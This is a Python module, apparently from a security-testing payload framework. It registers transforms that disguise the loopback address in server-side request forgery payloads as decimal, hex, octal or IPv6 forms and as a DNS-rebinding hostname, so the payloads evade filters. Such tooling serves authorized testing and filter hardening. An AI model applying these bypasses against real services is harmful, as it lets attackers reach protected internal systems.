"""Server-side request forgery payload obfuscation."""
from __future__ import annotations

from . import Payload, register


def _rewrite_ip(payload: str, target: str, replacement: str) -> str:
    return payload.replace(target, replacement)


@register(Payload(
    id="ssrf_ip_decimal", category="ssrf",
    explain="127.0.0.1 -> 2130706433",
    fidelity="transparent",
))
def ssrf_ip_decimal(payload: str) -> str:
    """Rewrite the loopback literal as its dotted-decimal integer form."""
    return _rewrite_ip(payload, "127.0.0.1", "2130706433")


@register(Payload(
    id="ssrf_ip_hex", category="ssrf",
    explain="127.0.0.1 -> 0x7f000001",
    fidelity="transparent",
))
def ssrf_ip_hex(payload: str) -> str:
    """Rewrite the loopback literal as a hexadecimal integer."""
    return _rewrite_ip(payload, "127.0.0.1", "0x7f000001")


@register(Payload(
    id="ssrf_ip_octal", category="ssrf",
    explain="127.0.0.1 -> 0177.0.0.1",
    fidelity="transparent",
))
def ssrf_ip_octal(payload: str) -> str:
    """Rewrite the first octet as C-style octal."""
    return _rewrite_ip(payload, "127.0.0.1", "0177.0.0.1")


@register(Payload(
    id="ssrf_localhost_alt", category="ssrf",
    explain="localhost -> 127.0.0.1, 127.0.0.1 -> [::1]",
    fidelity="transparent",
))
def ssrf_localhost_alt(payload: str) -> str:
    """Substitute alternate loopback spellings the same sink resolves."""
    out = payload.replace("localhost", "127.0.0.1")
    return out.replace("127.0.0.1", "[::1]")


@register(Payload(
    id="ssrf_dns_rebind", category="ssrf",
    explain="127.0.0.1 -> 7f000001.0a000001.rbndr.us",
    fidelity="differential",
))
def ssrf_dns_rebind(payload: str) -> str:
    """Rewrite the loopback literal as a DNS-rebindable hostname."""
    return _rewrite_ip(payload, "127.0.0.1", "7f000001.0a000001.rbndr.us")
